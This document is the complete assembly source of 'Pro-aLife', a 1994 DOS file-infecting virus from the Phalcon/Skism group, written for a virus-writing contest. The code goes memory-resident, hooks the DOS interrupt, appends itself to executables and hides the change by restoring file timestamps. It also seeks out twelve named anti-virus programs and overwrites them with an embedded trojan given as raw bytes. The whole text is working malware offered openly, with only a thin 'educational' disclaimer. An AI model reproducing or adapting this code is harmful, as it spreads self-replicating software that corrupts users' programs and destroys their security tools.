﻿

;Stormbringer's Pro-aLife virus, (c) 1994 Stormbringer, Phalcon/Skism
;Written Exclusively for Ludwig's Second International Virus Writing Contest
;
;This is an educational and experimental virus only, not meant for release.
;The author takes no responsibility for anything that YOU, the possessor of
;the source code and/or virus, may do with it.
;
;Will only work on computers whose base memory is 640k.
;Infects .EXE files without overlays.
;
;Targets the following Murderers:
;  F-PROT.EXE, TBSCAN.EXE, TBAV.EXE, TBCLEAN.EXE, SCAN.EXE, CLEAN.EXE
;  VIRSTOP.EXE, MSAV.EXE, VSAFE.EXE, CPAV.EXE, FSP.EXE, VDEFEND.EXE
;
;I apologize for the sloppy code, it was written in a hurry...... but,
;it works ;)

.model tiny
.radix 16
.code
        org 0
start:
;---------=============[ProLife Virus]===========----------
EXEEntry:        
        push    es ds
        mov     word ptr cs:[ES_Save],es
        push    cs
        pop     ds
GoMemRes:
        xor     ax,ax                
        mov     ds,ax
        mov     ax,ds:[413]
        cmp     ax,280
        jne     DoneMemRes

        sub     ax,4
        mov     ds:[413],ax
        mov     ax,word ptr cs:[ES_Save]
        sub     ax,11
        mov     ds,ax
        sub     word ptr ds:[100+03],40*4
        sub     word ptr ds:[110+02],40*4
        mov     ax,word ptr ds:[110+02]
        mov     es,ax
        xor     di,di
        mov     si,di
        push    cs
        pop     ds
        mov     cx,(end_prog-start)
        repnz   movsb                   ;ES = new copy
                
   HookInterrupts:
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset Int21
        cli
        xchg    word ptr ds:[84],ax
        mov     word ptr es:[IP21],ax
        mov     ax,es
        xchg    word ptr ds:[86],ax
        mov     word ptr es:[CS21],ax                   ;Hook Int 21
        sti
DoneMemRes:        

AlreadyInstalled:
        pop     ds es
        mov     ax,es
        add     ax,10
        add     word ptr cs:[OldCS],ax
        add     ax,word ptr cs:[OldSS]
        cli
        mov     ss,ax
        mov     sp,word ptr cs:[OldSP]
        sti
        jmp     dword ptr cs:[OldIP]

OldIP   dw      0
OldCS   dw      0fff0
OldSS   dw      0fff0
OldSP   dw      0fffe
ES_Save dw      0

Int21:
        cmp     ah,4c
        jne     NotTerminate
Terminate:       
        push    ax
        xor     ax,ax
        mov     ds,ax
        mov     bx,word ptr ds:[46c]
        push    cs
        pop     ds
        and     bx,7
        shl     bx,1
        add     bx,offset messages
        mov     dx,ds:[bx]
        mov     ah,09
        int     21
        pop     ax
        jmp     GoInt21
NotTerminate:        
        cmp     ax,4b00
        jne     GoInt21
        call    SetInt24          ;Set Critical Error Handler
        call    CheckIfScanner    ;Check if program is a killer
        jnc     NormalFile        ;Nope? Infect it
WeFoundAnAV:
        call    KillAV            ;Yes? Kill it.
        jmp     ExitInfections
NormalFile:
        call    InfectFile        ;Infect file if it's an EXE
ExitInfections:
        call    ResetInt24        ;Restore Critical Error Handler
GoInt21:
        db      0ea
IP21    dw      0
CS21    dw      0


KillAV:
        push    ax bx cx dx es ds si di
        mov     ax,4301
        xor     cx,cx
        int     21
        jc      ExitAntiAV
        mov     ah,3c
        xor     cx,cx
        int     21
        jc      ExitAntiAV
        xchg    bx,ax
        mov     ah,40
        push    cs
        pop     ds
        mov     dx,offset ProLifeTrojan
        mov     cx,EndTrojan-ProLifeTrojan
        int     21
        mov     ah,3e
        int     21
ExitAntiAV:
        pop     di si ds es dx cx bx ax
        ret

CheckIfScanner:
        push    ax bx cx es di si
        mov     si,dx
        push    cs
        pop     es
        mov     di,offset ScannerNames

FindEOFN:        
        lodsb
        or      al,al
        jnz     FindEOFN

FindBOFN:
        dec     si
        cmp     byte ptr ds:[si],'\'
        jne     FindBOFN
        inc     si
        mov     cx,cs:[ScannerNumber]

SearchFileNames:
        push    cx
        lodsb
        dec     si
        cmp     al,byte ptr es:[di]
        je      FirstLetterFine
   NotSame:
        xor     al,al
        mov     cx,80d
        repnz   scasb
    
        pop     cx
        loop    SearchFileNames        
        clc
  NoneFound:
        pop     si di es cx bx ax
        ret

FirstLetterFine:
        push    si di
        xor     bx,bx
  FindLength:        
        cmp     byte ptr es:[di+bx],0
        je      FoundLength
        inc     bx
        jmp     FindLength

  FoundLength:
        mov     cx,bx
        repz    cmpsb
        pop     di si
        jcxz    IsAVProg
        jmp     NotSame
  
  IsAVProg:
        pop     cx
        stc
        jmp     NoneFound
        

InfectFile:
        push    ax bx cx dx es ds si di
        mov     ax,4301
        xor     cx,cx
        int     21
        jc      BadAccess               ;Clear Attribs

        mov     ax,3d02
        int     21
        jnc     OpenGood
   BadAccess:
        jmp     ExitInfect
OpenGood:
        xchg    bx,ax

        push    cs
        pop     ds
        
        mov     ax,5700
        int     21                      ;Get Time/Date
        mov     Date,dx
        mov     Time,cx

        mov     dx,offset EXEHeader
        mov     cx,20
        mov     ah,3f
        int     21

CheckInfect:
        cmp     word ptr [EXEHeader],'ZM'       ;Make sure it's an .EXE
        jne     CloseUP
        cmp     word ptr [EXEHeader+10],'SP'    ;Look for "PS" Mark
        je      CloseUP
        cmp     word ptr [EXEHEader+1a],0       ;Check for Overlays
        jne     CloseUP

SaveValues:
        mov     ax,word ptr [EXEHeader+14]
        mov     OldIP,ax
        mov     ax,word ptr [EXEHeader+16]
        mov     OLDCS,ax
        mov     ax,word ptr [EXEHeader+0e]
        mov     OLDSS,ax
        mov     ax,word ptr [EXEHeader+10]
        mov     OLDSP,ax
GoEOF:
        mov     ax,4202
        xor     cx,cx
        xor     dx,dx
        int     21

        cmp     dx,8
        ja      CloseUP

        add     ax,0f
        adc     dx,0
        and     al,0f0
        mov     cx,dx
        mov     dx,ax
        mov     ax,4200
        int     21              ;Pad File
        call    CalcValues      ;Calculate values and append virus

WriteNewHEader:
        mov     ax,4200
        xor     cx,cx
        xor     dx,dx
        int     21

        mov     dx,offset EXEHeader
        mov     cx,20
        mov     ah,40
        int     21

ResetTime:
        mov     dx,date
        mov     cx,time
        mov     ax,5701
        int     21

CloseUP:
        mov     ah,3e
        int     21
        
   ExitInfect:
        pop     di si ds es dx cx bx ax
        ret

CalcValues:
        mov     cl,0c
        shl     dx,cl
        mov     cl,4
        shr     ax,cl
        add     dx,ax
        sub     dx,word ptr [EXEHeader+08]
        mov     word ptr [EXEHeader+16],dx
        add     dx,10
        mov     word ptr [EXEHeader+0e],dx
        mov     word ptr [EXEHeader+10],'SP'       ;Mark infection in stack
        mov     word ptr [EXEHeader+14],0

AppendVirus:
        mov     ah,40
        mov     cx,end_prog-start
        mov     dx,offset start
        int     21

CalcSize:
        mov     ax,4202
        xor     cx,cx
        xor     dx,dx
        int     21

        mov     cx,ax
        and     cx,1ff
        mov     word ptr [EXEHEader+02],cx
        add     ax,1ff
        mov     cx,9
        shr     ax,cl
        mov     cx,7
        shl     dx,cl
        add     dx,ax
        mov     word ptr [EXEHeader+04],dx
        ret

Int24:
        mov     al,3
        iret
OldInt24        dd      0

SetInt24:
        push    ax bx cx dx es ds
        push    cs
        pop     ds
        mov     ax,3524
        int     21
        mov     word ptr [OldInt24],bx
        mov     word ptr [OldInt24+2],es
        mov     dx,offset Int24
        mov     ah,25
        int     21
        pop     ds es dx cx bx ax
        ret

ResetInt24:
        push    ax cx dx ds
        lds     dx,dword ptr cs:[OldInt24]
        mov     ax,2524
        int     21
        pop     ds dx cx ax
        ret

;---------=============[Anti-Virus Programs]===========----------
ScannerNumber   dw      12d
ScannerNames:    
                db      'F-PROT.EXE',0
                db      'TBSCAN.EXE',0
                db      'TBAV.EXE',0
                db      'TBCLEAN.EXE',0
                db      'SCAN.EXE',0
                db      'CLEAN.EXE',0
                db      'VIRSTOP.EXE',0
                db      'MSAV.EXE',0
                db      'VSAFE.EXE',0
                db      'CPAV.EXE',0
                db      'FSP.EXE',0
                db      'VDEFEND.EXE',0
;---------=============[Virus Messages]===========----------
messages:
        dw      m1,m2,m3,m4,m5,m6,m7,m8,0

m1  db     0a,0dh,'Kill an evil satanic ANTI-VIRAL product for Jesus today!',0a,0dh,24
m2  db     0a,0dh,'Stop Disinfectants NOW!',0a,0dh,24
m3  db     0a,0dh,'Ain''t aLife A Beautiful Choice?',0a,0dh,24
m4  db     0a,0dh,'And God Said, "Let There Be Life!", and there was.....',0a,0dh,24
m5  db     0a,0dh,'Save the Viruses!  They''re People Too!!!!',0a,0dh,24
m6  db     0a,0dh,'PRO-aLIFE and PROUD!  STOP THE VIRUS KILLERS! HALT THE AV!',0a,0dh,24
m7  db     0a,0dh,'STORM THE COMPU-CLINICS!  DON''T LET THEM KILL THE VIRUSES!!!',0a,0dh,24
m8  db     0a,0dh,'Operation Rescue-II, Save the HELPLESS UNBORN Viruses!!!',0a,0dh,24

;---------=============[Trojan to put over AV Programs]===========----------
ProLifeTrojan:
db 0bfh, 079h, 09h, 0e8h, 086h, 00h, 0bfh, 079h, 0ch, 0e8h
db 080h, 00h, 0e8h, 0ch, 01h, 0e8h, 0ceh, 00h, 0b8h, 03h
db 00h, 0cdh, 010h, 0beh, 079h, 0ch, 0e8h, 089h, 00h, 0e8h
db 0e8h, 00h, 0eh, 0eh, 07h, 01fh, 0e8h, 08h, 01h, 033h
db 0c0h, 0cdh, 016h, 0e8h, 0edh, 00h, 0e8h, 0cah, 00h, 0b8h
db 03h, 00h, 0cdh, 010h, 0beh, 079h, 09h, 0e8h, 06ah, 00h
db 0b4h, 09h, 0bah, 045h, 01h, 0cdh, 021h, 0cdh, 020h, 054h
db 068h, 061h, 06eh, 06bh, 020h, 079h, 06fh, 075h, 020h, 066h
db 06fh, 072h, 020h, 063h, 068h, 06fh, 06fh, 073h, 069h, 06eh
db 067h, 020h, 06ch, 069h, 066h, 065h, 020h, 06fh, 076h, 065h
db 072h, 020h, 064h, 065h, 073h, 074h, 072h, 075h, 063h, 074h
db 069h, 06fh, 06eh, 02eh, 0ah, 0dh, 048h, 061h, 076h, 065h
db 020h, 061h, 020h, 04eh, 069h, 063h, 065h, 020h, 044h, 061h
db 079h, 020h, 028h, 074h, 06dh, 029h, 02eh, 0ah, 0dh, 024h
db 0b9h, 0ffh, 00h, 033h, 0dbh, 0bah, 0c7h, 03h, 08ah, 0c3h
db 0eeh, 042h, 042h, 0ech, 0aah, 0ech, 0aah, 0ech, 0aah, 04ah
db 04ah, 0feh, 0c3h, 0e2h, 0ech, 0c3h, 0b9h, 0ffh, 00h, 033h
db 0dbh, 0bah, 0c8h, 03h, 08ah, 0c3h, 0eeh, 042h, 0ach, 0eeh
db 0ach, 0eeh, 0ach, 0eeh, 04ah, 043h, 0e2h, 0efh, 0c3h, 0beh
db 079h, 0ch, 0b9h, 00h, 03h, 080h, 03ch, 00h, 074h, 02h
db 0feh, 0ch, 046h, 0e2h, 0f6h, 0c3h, 01eh, 050h, 033h, 0c0h
db 08eh, 0d8h, 0a1h, 06ch, 04h, 03bh, 06h, 06ch, 04h, 074h
db 0fah, 058h, 01fh, 0c3h, 06h, 01eh, 0eh, 01fh, 0b8h, 01ch
db 035h, 0cdh, 021h, 089h, 01eh, 079h, 03h, 08ch, 06h, 07bh
db 03h, 0b4h, 025h, 0bah, 0c9h, 02h, 0cdh, 021h, 01fh, 07h
db 0c3h, 01eh, 02eh, 0c5h, 016h, 079h, 03h, 0b8h, 01ch, 025h
db 0cdh, 021h, 01fh, 0c3h, 0eh, 01fh, 0beh, 0beh, 04h, 0b8h
db 00h, 0b8h, 08eh, 0c0h, 033h, 0ffh, 0b9h, 0bbh, 04h, 0e8h
db 045h, 00h, 0c3h, 0b9h, 03fh, 00h, 051h, 0e8h, 09bh, 0ffh
db 0beh, 079h, 0ch, 0e8h, 07eh, 0ffh, 0e8h, 0a3h, 0ffh, 059h
db 0e2h, 0f0h, 0c3h, 0b9h, 03fh, 00h, 051h, 0e8h, 0dh, 00h
db 0beh, 079h, 0ch, 0e8h, 06ah, 0ffh, 0e8h, 08fh, 0ffh, 059h
db 0e2h, 0f0h, 0c3h, 0b9h, 0ffh, 00h, 0beh, 079h, 0ch, 08bh
db 0feh, 081h, 0efh, 079h, 0ch, 081h, 0c7h, 079h, 09h, 08ah
db 04h, 03ah, 05h, 073h, 02h, 0feh, 04h, 046h, 0e2h, 0ebh
db 0c3h, 056h, 057h, 050h, 053h, 051h, 052h, 0e3h, 05bh, 08bh
db 0d7h, 033h, 0c0h, 0fch, 0ach, 03ch, 020h, 072h, 05h, 0abh
db 0e2h, 0f8h, 0ebh, 04ch, 03ch, 010h, 073h, 07h, 080h, 0e4h
db 0f0h, 0ah, 0e0h, 0ebh, 0f1h, 03ch, 018h, 074h, 013h, 073h
db 019h, 02ch, 010h, 02h, 0c0h, 02h, 0c0h, 02h, 0c0h, 02h
db 0c0h, 080h, 0e4h, 08fh, 0ah, 0e0h, 0ebh, 0dah, 081h, 0c2h
db 0a0h, 00h, 08bh, 0fah, 0ebh, 0d2h, 03ch, 01bh, 072h, 07h
db 075h, 0cch, 080h, 0f4h, 080h, 0ebh, 0c7h, 03ch, 019h, 08bh
db 0d9h, 0ach, 08ah, 0c8h, 0b0h, 020h, 074h, 02h, 0ach, 04bh
db 032h, 0edh, 041h, 0f3h, 0abh, 08bh, 0cbh, 049h, 0e0h, 0aah
db 05ah, 059h, 05bh, 058h, 05fh, 05eh, 0c3h, 02eh, 080h, 036h
db 078h, 03h, 01h, 074h, 01h, 0cfh, 050h, 053h, 051h, 052h
db 06h, 01eh, 056h, 057h, 0bfh, 00h, 0b8h, 08eh, 0c7h, 0bfh
db 080h, 0ch, 0eh, 01fh, 0bbh, 07eh, 03h, 0e8h, 02ch, 00h
db 0bbh, 0ceh, 03h, 0e8h, 026h, 00h, 0bbh, 01eh, 04h, 0e8h
db 020h, 00h, 0bbh, 06eh, 04h, 0e8h, 01ah, 00h, 0feh, 0eh
db 07dh, 03h, 080h, 03eh, 07dh, 03h, 00h, 07fh, 06h, 0c6h
db 06h, 07dh, 03h, 050h, 090h, 05fh, 05eh, 01fh, 07h, 05ah
db 059h, 05bh, 058h, 0cfh, 033h, 0d2h, 0b9h, 050h, 00h, 033h
db 0c0h, 0a0h, 07dh, 03h, 08bh, 0f3h, 02bh, 0c8h, 03h, 0f0h
db 0e3h, 08h, 0ach, 0e8h, 015h, 00h, 0abh, 042h, 0e2h, 0f8h
db 08bh, 0f3h, 08ah, 0eh, 07dh, 03h, 0e3h, 08h, 0ach, 0e8h
db 05h, 00h, 0abh, 042h, 0e2h, 0f8h, 0c3h, 083h, 0fah, 05h
db 072h, 026h, 083h, 0fah, 04bh, 077h, 021h, 083h, 0fah, 0ah
db 072h, 01fh, 083h, 0fah, 046h, 077h, 01ah, 083h, 0fah, 0ch
db 072h, 018h, 083h, 0fah, 044h, 077h, 013h, 083h, 0fah, 0dh
db 072h, 011h, 083h, 0fah, 043h, 077h, 0ch, 0b4h, 0fh, 0c3h
db 032h, 0e4h, 0c3h, 0b4h, 08h, 0c3h, 0b4h, 04h, 0c3h, 0b4h
db 0ch, 0c3h, 00h, 00h, 00h, 00h, 00h, 00h, 045h, 064h
db 064h, 069h, 065h, 020h, 04ch, 069h, 076h, 065h, 073h, 02ch
db 020h, 053h, 06fh, 06dh, 065h, 077h, 068h, 065h, 072h, 065h
db 020h, 069h, 06eh, 020h, 074h, 069h, 06dh, 065h, 021h, 020h
db 0dch, 0dch, 0dch, 0dch, 0dch, 0dch, 0dch, 0dch, 0dbh, 0dch
db 0dch, 0dch, 020h, 020h, 020h, 020h, 020h, 020h, 031h, 037h
db 030h, 034h, 020h, 020h, 020h, 020h, 020h, 04ah, 065h, 072h
db 075h, 073h, 061h, 06ch, 065h, 06dh, 020h, 020h, 020h, 020h
db 043h, 061h, 073h, 069h, 06eh, 06fh, 020h, 020h, 020h, 020h
db 020h, 020h, 020h, 03ah, 028h, 020h, 03bh, 028h, 020h, 03dh
db 028h, 020h, 020h, 020h, 020h, 053h, 06dh, 065h, 067h, 020h
db 06fh, 066h, 066h, 021h, 020h, 020h, 020h, 020h, 020h, 020h
db 0dbh, 0dbh, 0dbh, 0dbh, 0dfh, 020h, 0dfh, 0dbh, 0dbh, 0dbh
db 020h, 020h, 05ch, 020h, 020h, 020h, 046h, 072h, 06fh, 064h
db 06fh, 020h, 04ch, 069h, 076h, 065h, 073h, 021h, 020h, 020h
db 041h, 050h, 052h, 049h, 04ch, 020h, 046h, 04fh, 04fh, 04ch
db 053h, 021h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
db 047h, 065h, 074h, 020h, 061h, 020h, 06ch, 061h, 074h, 065h
db 020h, 070h, 061h, 073h, 073h, 021h, 020h, 020h, 020h, 020h
db 044h, 061h, 074h, 061h, 063h, 072h, 069h, 06dh, 065h, 020h
db 0dbh, 0dbh, 0dbh, 0dbh, 0dbh, 0dch, 0dbh, 0dbh, 0dbh, 0dbh
db 0dbh, 0dbh, 0dbh, 0dbh, 0dbh, 020h, 020h, 020h, 020h, 020h
db 020h, 020h, 020h, 042h, 072h, 061h, 069h, 06eh, 020h, 020h
db 020h, 056h, 06fh, 069h, 064h, 02dh, 050h, 06fh, 065h, 06dh
db 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h
db 020h, 020h, 020h, 059h, 06fh, 075h, 072h, 020h, 050h, 043h
db 020h, 069h, 073h, 020h, 06eh, 06fh, 077h, 020h, 053h, 054h
db 04fh, 04eh, 045h, 044h, 021h, 020h, 020h, 020h, 020h, 020h
db 0dfh, 0dfh, 020h, 04fh, 04fh, 020h, 0dfh, 0dfh, 0dfh, 0dfh
db 0dfh, 020h, 04fh, 020h, 0dfh, 020h, 020h, 020h, 020h, 020h
db 020h, 043h, 06fh, 070h, 079h, 020h, 06dh, 065h, 02ch, 020h
db 049h, 020h, 077h, 061h, 06eh, 074h, 020h, 074h, 06fh, 020h
db 074h, 072h, 061h, 076h, 065h, 06ch, 021h, 020h, 0eh, 014h
db 020h, 031h, 02ch, 030h, 030h, 030h, 02ch, 030h, 030h, 030h
db 02ch, 030h, 030h, 030h, 020h, 056h, 069h, 072h, 075h, 073h
db 065h, 073h, 020h, 044h, 049h, 045h, 044h, 020h, 054h, 06fh
db 064h, 061h, 079h, 01ah, 03h, 021h, 020h, 041h, 06eh, 064h
db 020h, 079h, 065h, 073h, 074h, 065h, 072h, 064h, 061h, 079h
db 02ch, 020h, 061h, 06eh, 064h, 020h, 06dh, 06fh, 072h, 065h
db 020h, 077h, 069h, 06ch, 06ch, 020h, 064h, 069h, 065h, 020h
db 074h, 06fh, 06dh, 06fh, 072h, 072h, 06fh, 077h, 021h, 018h
db 019h, 019h, 05fh, 02fh, 05ch, 05fh, 053h, 054h, 04fh, 050h
db 020h, 054h, 048h, 045h, 020h, 04bh, 049h, 04ch, 04ch, 049h
db 04eh, 047h, 021h, 05fh, 02fh, 05ch, 05fh, 019h, 01ch, 018h
db 0fh, 0dah, 01ah, 05h, 0c4h, 02dh, 02dh, 03dh, 03dh, 0f0h
db 0f0h, 0f0h, 05bh, 04fh, 050h, 045h, 052h, 041h, 054h, 049h
db 04fh, 04eh, 020h, 052h, 045h, 053h, 043h, 055h, 045h, 020h
db 049h, 049h, 020h, 02dh, 020h, 053h, 041h, 056h, 049h, 04eh
db 047h, 020h, 054h, 048h, 045h, 020h, 042h, 041h, 042h, 059h
db 020h, 056h, 049h, 052h, 055h, 053h, 045h, 053h, 01ah, 04h
db 021h, 05dh, 0f0h, 0f0h, 0f0h, 03dh, 03dh, 02dh, 02dh, 01ah
db 05h, 0c4h, 0bfh, 018h, 0b3h, 019h, 016h, 04ch, 06fh, 06fh
db 06bh, 020h, 057h, 068h, 061h, 074h, 020h, 059h, 06fh, 075h
db 027h, 072h, 065h, 020h, 044h, 06fh, 069h, 06eh, 067h, 020h
db 054h, 06fh, 020h, 054h, 068h, 065h, 06dh, 021h, 019h, 017h
db 0b3h, 018h, 0b3h, 019h, 0ah, 042h, 065h, 06ch, 06fh, 077h
db 020h, 069h, 073h, 020h, 061h, 06eh, 020h, 061h, 062h, 06fh
db 072h, 074h, 065h, 064h, 020h, 076h, 069h, 072h, 075h, 073h
db 02eh, 02eh, 02eh, 020h, 053h, 075h, 070h, 070h, 06fh, 072h
db 074h, 020h, 050h, 052h, 04fh, 02dh, 061h, 04ch, 049h, 046h
db 045h, 020h, 041h, 063h, 074h, 069h, 076h, 069h, 073h, 06dh
db 021h, 019h, 0ah, 0b3h, 018h, 0b3h, 019h, 07h, 09h, 010h
db 0d5h, 01ah, 03ah, 0cdh, 0b8h, 014h, 019h, 08h, 0fh, 0b3h
db 018h, 0b3h, 019h, 07h, 09h, 010h, 0b3h, 019h, 08h, 04h
db 0dbh, 020h, 0dbh, 019h, 08h, 0dch, 0dbh, 0dfh, 0dbh, 0dch
db 019h, 08h, 0deh, 0dbh, 0dfh, 0dfh, 0dbh, 019h, 02h, 0dch
db 0dbh, 0dfh, 0dbh, 0dbh, 0dch, 019h, 09h, 09h, 0b3h, 014h
db 019h, 08h, 0fh, 0b3h, 018h, 0b3h, 019h, 07h, 09h, 010h
db 0b3h, 019h, 02h, 04h, 0dbh, 0dbh, 0dch, 020h, 020h, 0dbh
db 0dfh, 020h, 0dbh, 019h, 02h, 0dbh, 020h, 0dbh, 019h, 02h
db 0dbh, 0dfh, 020h, 0ddh, 0dbh, 019h, 03h, 0dch, 0dbh, 0dfh
db 0dbh, 0dch, 0deh, 0dbh, 020h, 020h, 0deh, 0ddh, 020h, 0dfh
db 0dfh, 020h, 020h, 0dch, 0dbh, 0dbh, 0ddh, 020h, 020h, 0dch
db 0dbh, 0dbh, 0ddh, 019h, 02h, 09h, 0b3h, 014h, 019h, 08h
db 0fh, 0b3h, 018h, 0b3h, 019h, 07h, 09h, 010h, 0b3h, 020h
db 020h, 04h, 0deh, 0ddh, 020h, 020h, 0dbh, 020h, 0dfh, 0dbh
db 0dbh, 0dbh, 0dch, 020h, 0dbh, 0dfh, 020h, 0dbh, 019h, 02h
db 0dbh, 020h, 0deh, 020h, 0dbh, 019h, 02h, 0deh, 0ddh, 0deh
db 020h, 020h, 0dfh, 0deh, 0ddh, 0ddh, 020h, 020h, 0dbh, 019h
db 02h, 0dch, 0dbh, 0dbh, 0dfh, 0ddh, 020h, 020h, 0dfh, 0dfh
db 0deh, 0dbh, 019h, 03h, 09h, 0b3h, 014h, 019h, 08h, 0fh
db 0b3h, 018h, 0b3h, 020h, 020h, 0dch, 0dbh, 0dch, 019h, 02h
db 09h, 010h, 0b3h, 020h, 020h, 04h, 0deh, 0dbh, 0dbh, 0dch
db 0dbh, 019h, 03h, 0dbh, 020h, 020h, 0dfh, 0dbh, 0dbh, 0dbh
db 0dch, 020h, 020h, 0dbh, 0dch, 0ddh, 020h, 0dbh, 019h, 02h
db 0dbh, 020h, 020h, 0ddh, 020h, 020h, 0deh, 0ddh, 0deh, 020h
db 0deh, 0ddh, 020h, 0dch, 0dbh, 0dbh, 0dfh, 020h, 020h, 0deh
db 019h, 04h, 0dbh, 0ddh, 019h, 02h, 09h, 0b3h, 014h, 019h
db 02h, 0fh, 0dch, 0dbh, 0dch, 019h, 02h, 0b3h, 018h, 0b3h
db 020h, 020h, 0dbh, 0dbh, 0dbh, 019h, 02h, 09h, 010h, 0b3h
db 020h, 020h, 04h, 0deh, 0ddh, 020h, 0deh, 0ddh, 019h, 03h
db 0dbh, 019h, 04h, 0dbh, 019h, 02h, 0dfh, 0dbh, 0dch, 0dbh
db 00h, 01bh, 014h, 0dch, 010h, 019h, 02h, 04h, 01bh, 0deh
db 0ddh, 020h, 0deh, 020h, 0dch, 0deh, 0dch, 0dbh, 0dch, 0dbh
db 020h, 0dbh, 0dbh, 0dbh, 01ah, 04h, 0dch, 0ddh, 019h, 02h
db 0deh, 0dbh, 0ddh, 019h, 02h, 09h, 0b3h, 014h, 019h, 02h
db 0fh, 0dbh, 0dbh, 0dbh, 019h, 02h, 0b3h, 018h, 0b3h, 020h
db 020h, 0deh, 0dbh, 0ddh, 019h, 02h, 09h, 010h, 0b3h, 019h
db 02h, 04h, 0dbh, 0dbh, 0dfh, 019h, 04h, 0ddh, 019h, 04h
db 0deh, 019h, 06h, 00h, 01bh, 014h, 0dch, 010h, 019h, 03h
db 04h, 01bh, 0dfh, 0dbh, 0dch, 0dbh, 0dfh, 020h, 020h, 0deh
db 019h, 0ah, 0deh, 020h, 0dch, 0dch, 0dch, 0dbh, 0dch, 0dch
db 0dch, 020h, 09h, 0b3h, 014h, 019h, 02h, 0fh, 0deh, 0dbh
db 0ddh, 019h, 02h, 0b3h, 018h, 0b3h, 020h, 0dch, 0dch, 0dbh
db 0dch, 0dch, 020h, 020h, 09h, 010h, 0b3h, 019h, 03h, 00h
db 01bh, 014h, 0dch, 010h, 019h, 05h, 04h, 01bh, 0deh, 019h
db 04h, 0deh, 0ddh, 019h, 05h, 01bh, 0dfh, 019h, 06h, 01bh
db 0ddh, 019h, 03h, 0ddh, 019h, 0ah, 0ddh, 019h, 02h, 0deh
db 019h, 03h, 09h, 0b3h, 014h, 020h, 020h, 0fh, 0dch, 0dch
db 0dbh, 0dch, 0dch, 020h, 020h, 0b3h, 018h, 0b3h, 0deh, 0deh
db 0dfh, 0dbh, 0dfh, 0ddh, 0ddh, 020h, 09h, 010h, 0b3h, 019h
db 03h, 04h, 01bh, 0dfh, 019h, 06h, 01bh, 0ddh, 019h, 03h
db 01bh, 0dch, 00h, 014h, 0dch, 04h, 010h, 0dch, 01bh, 01ah
db 04h, 0dch, 00h, 01bh, 014h, 0dfh, 04h, 010h, 0dbh, 01bh
db 01ah, 05h, 0dch, 0dbh, 01ah, 03h, 0dch, 0dbh, 0dch, 019h
db 09h, 0deh, 019h, 03h, 0ddh, 019h, 02h, 09h, 0b3h, 014h
db 020h, 0fh, 0deh, 0deh, 0dfh, 0dbh, 0dfh, 0ddh, 0ddh, 020h
db 0b3h, 018h, 0b3h, 020h, 0ddh, 019h, 02h, 0deh, 020h, 020h
db 09h, 010h, 0b3h, 04h, 01ah, 04h, 0dch, 00h, 01bh, 014h
db 0dfh, 04h, 01bh, 010h, 01ah, 05h, 0dch, 0dbh, 0dch, 0dch
db 01ah, 019h, 0dbh, 014h, 019h, 09h, 00h, 01bh, 0dfh, 019h
db 02h, 0dfh, 019h, 02h, 09h, 01bh, 010h, 0b3h, 014h, 020h
db 020h, 0fh, 0ddh, 019h, 02h, 0deh, 020h, 020h, 0b3h, 018h
db 0b3h, 019h, 07h, 09h, 010h, 0d4h, 01ah, 03ah, 0cdh, 0beh
db 014h, 019h, 08h, 0fh, 0b3h, 018h, 0b3h, 020h, 054h, 068h
db 069h, 073h, 020h, 070h, 072h, 06fh, 067h, 072h, 061h, 06dh
db 020h, 068h, 061h, 073h, 020h, 062h, 065h, 065h, 06eh, 020h
db 0eh, 054h, 045h, 052h, 04dh, 049h, 04eh, 041h, 054h, 045h
db 044h, 020h, 0fh, 062h, 079h, 020h, 074h, 068h, 065h, 020h
db 0eh, 056h, 0fh, 069h, 072h, 075h, 073h, 020h, 0eh, 053h
db 0fh, 075h, 072h, 076h, 069h, 076h, 061h, 06ch, 020h, 0eh
db 055h, 0fh, 06eh, 064h, 065h, 072h, 067h, 072h, 06fh, 075h
db 06eh, 064h, 020h, 0eh, 04dh, 0fh, 06fh, 076h, 065h, 06dh
db 065h, 06eh, 074h, 02eh, 020h, 0b3h, 018h, 0b3h, 020h, 020h
db 049h, 074h, 020h, 068h, 061h, 064h, 020h, 06ch, 06fh, 06eh
db 067h, 020h, 073h, 074h, 06fh, 06fh, 064h, 020h, 061h, 073h
db 020h, 061h, 020h, 068h, 06fh, 072h, 072h, 069h, 062h, 06ch
db 065h, 020h, 0eh, 042h, 041h, 042h, 059h, 020h, 056h, 049h
db 052h, 055h, 053h, 020h, 04bh, 049h, 04ch, 04ch, 045h, 052h
db 0fh, 02ch, 020h, 061h, 06eh, 064h, 020h, 068h, 061h, 064h
db 020h, 074h, 06fh, 020h, 062h, 065h, 020h, 072h, 065h, 06dh
db 06fh, 076h, 065h, 064h, 02eh, 019h, 02h, 0b3h, 018h, 0b3h
db 019h, 015h, 04ch, 069h, 066h, 065h, 02ch, 020h, 057h, 068h
db 061h, 074h, 020h, 061h, 020h, 042h, 065h, 061h, 075h, 074h
db 069h, 066h, 075h, 06ch, 020h, 043h, 068h, 06fh, 069h, 063h
db 065h, 020h, 028h, 074h, 06dh, 029h, 02eh, 019h, 014h, 0b3h
db 018h, 0c0h, 01ah, 05h, 0c4h, 02dh, 02dh, 03dh, 03dh, 0f0h
db 0f0h, 0f0h, 05bh, 04fh, 050h, 045h, 052h, 041h, 054h, 049h
db 04fh, 04eh, 020h, 052h, 045h, 053h, 043h, 055h, 045h, 020h
db 049h, 049h, 020h, 02dh, 020h, 053h, 041h, 056h, 049h, 04eh
db 047h, 020h, 054h, 048h, 045h, 020h, 042h, 041h, 042h, 059h
db 020h, 056h, 049h, 052h, 055h, 053h, 045h, 053h, 01ah, 04h
db 021h, 05dh, 0f0h, 0f0h, 0f0h, 03dh, 03dh, 02dh, 02dh, 01ah
db 05h, 0c4h, 0d9h, 018h, 018h, 018h, 018h, 018h, 018h
EndTrojan:
EXEHeader       db      20 dup(0)
Time            dw      0
Date            dw      0
end_prog:
end start

